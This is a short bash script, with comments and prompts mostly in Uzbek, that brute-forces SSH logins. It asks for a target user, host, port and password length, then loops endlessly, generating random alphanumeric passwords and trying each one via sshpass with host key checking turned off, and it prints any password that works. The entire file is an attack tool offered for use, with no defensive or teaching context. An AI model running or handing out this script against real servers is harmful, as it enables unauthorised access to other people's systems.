#!/bin/bash
# brute_force_ssh.sh
#This script asks the user to enter the SSH userName, IP address, port and password length. Then create random passwords and check them.

# Foydalanuvchidan SSH uchun foydalanuvchi nomi, IP manzil va portni kiritishni so'rash
read -p "SSH foydalanuvchi nomini kiriting: " USER
read -p "SSH serverining IP manzilini kiriting: " HOST
read -p "SSH serverining portini kiriting: " PORT

# Foydalanuvchidan parol uzunligini kiritish so'raladi
read -p "Parol uzunligini kiriting: " PASSWORD_LENGTH

# Parolni yaratish uchun foydalaniladigan belgilar to'plami
CHAR_SET="A-Za-z0-9"

# Parolni yaratish funksiyasi
generate_password() {
    local password=$(tr -dc "$CHAR_SET" </dev/urandom | head -c $PASSWORD_LENGTH)
    echo "$password"
}

# Parolni tekshirish funksiyasi
check_password() {
    local password=$1
    sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 $USER@$HOST -p $PORT "exit" &> /dev/null
    if [ $? -eq 0 ]; then
        echo "Parol topildi: $password"
        exit 0
    fi
}

# Dastur boshlanishida ma'lumotlarni ko'rsatish
echo "SSH foydalanuvchi nomi: $USER"
echo "SSH porti: $PORT"
echo "Parol uzunligi: $PASSWORD_LENGTH"
echo "Parollar quyidagi belgilar to'plamidan tanlanadi: $CHAR_SET"

# Tasodifiy parollarni yaratish va tekshirish
while true; do
    password=$(generate_password)
    echo "Tekshirilmoqda: $password"
    check_password "$password"
done

echo "To'g'ri parol topilmadi."

